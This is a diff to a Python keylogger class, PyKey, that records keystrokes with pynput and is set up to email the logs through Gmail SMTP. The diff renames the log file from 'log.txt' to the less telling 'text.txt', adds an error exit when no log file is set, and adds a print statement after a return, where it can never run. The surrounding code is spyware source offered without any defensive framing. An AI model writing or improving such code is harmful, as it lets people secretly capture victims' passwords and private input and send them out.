@@ -4,6 +4,7 @@ from pynput import keyboard
 import logging
 import platform
 import smtplib
+import sys, errno
 from os.path import basename
 from email.mime.application import MIMEApplication
 from email.mime.multipart import MIMEMultipart
@@ -26,7 +27,7 @@ class PyKey:
         self.EMAIL_TO=''
         self.GMAIL_USER=''
         self.GMAIL_PWD=''
-        self.LOG_FILE = 'log.txt'
+        self.LOG_FILE = 'text.txt'
         self.TERMINATE_KEY = "esc"
         self.CLEAR_ON_STARTUP = False
         self.MAP = {
@@ -176,6 +177,8 @@ class PyKey:
             if not modifier and event.event_type == "down":
                 return
 
+                print(key)
+
             if modifier:
                 if event.event_type == "down":
                     if is_down.get(key, False):
@@ -186,6 +189,7 @@ class PyKey:
                     is_down[key] = False
 
                 key = " [{} ({})] ".format(key, event.event_type)
+                #logging.log(10,'{}'.format(keyName))
             elif key == "\r":
                 key = "\n"
             output.write(key)
@@ -227,6 +231,10 @@ class PyKey:
     def start(self):
         """ Start the key record
         """
+        if self.LOG_FILE == '':
+            print("Error: Log file not found")
+            sys.exit(errno.EACCES)
+
         self.recordKeys()
 
 
